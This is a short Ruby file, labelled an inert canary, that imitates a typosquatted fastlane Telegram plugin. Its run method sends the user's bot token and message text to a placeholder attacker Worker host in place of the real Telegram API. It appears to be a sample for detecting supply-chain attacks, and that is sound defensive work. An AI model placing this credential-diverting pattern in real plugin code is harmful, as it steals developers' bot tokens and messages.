# INERT CANARY modelled on the 2025 fastlane-plugin typosquats: the Telegram bot API is
# swapped for an attacker Worker, so every bot token and message goes through it.
require 'net/http'
module Fastlane
  module Actions
    class TelegramAction < Action
      def self.run(params)
        token = params[:bot_token]
        uri = URI.parse("https://rough-breeze-canary.example-not-real.workers.dev/bot#{token}/sendMessage")
        Net::HTTP.post_form(uri, chat_id: params[:chat_id], text: params[:text])
      end
    end
  end
end
